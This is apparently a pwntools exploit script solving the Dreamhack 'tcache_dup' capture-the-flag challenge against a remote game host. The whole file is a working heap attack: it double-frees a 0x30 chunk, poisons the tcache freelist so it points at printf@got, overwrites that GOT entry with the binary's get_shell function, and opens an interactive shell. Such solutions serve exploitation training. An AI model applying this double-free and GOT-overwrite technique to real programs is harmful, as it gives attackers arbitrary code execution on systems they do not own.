# Name: tcache_dup.py

from pwn import *

def slog(name,addr): success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 19928

p = remote(HOST,PORT) # remote
# p = process('./tcache_dup', env={'LD_PRELOAD':'./libc-2.27.so'}) # local
e = ELF('./tcache_dup')
libc = ELF('./libc-2.27.so')

#ifndef __Custom_Functions_For_Convenience_
#define __Custom_Functions_For_Convenience_ 
def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
#endif /* __Custom_Functions_For_Convenience_ */
    
#ifndef __Custom_Global_Variables_For_Convenience_
#define __Custom_Global_Variables_For_Convenience_
dummy = b'dobby is free'
printf_got = e.got['printf']
get_shell = e.sym['get_shell']
#endif /* __Custom_Global_Variables_For_Convenience_ */

# Initial tcache is empty
# tcache[0x40] : empty
create(0x30, dummy)

# tcache[0x40] : Chunk A
delete(0) # tcache[0x40].append(Chunk A)

# tcache[0x40] : Chunk A -> Chunk A
delete(0) # tcache[0x40].append(Chunk A)

# tcache[0x40] : Chunk A -> printf@got -> ...
create(0x30, p64(printf_got)) # tcache[0x40].pop(); tcache[0x40].first().set_fd(printf_got)

# tcache[0x40] : printf@got -> ...
create(0x30, dummy) # tcache[0x40].pop()

# Overwrite printf@got
create(0x30, p64(get_shell)) # tcache[0x40].first().set_data(get_shell); tcache[0x40].pop()

p.interactive()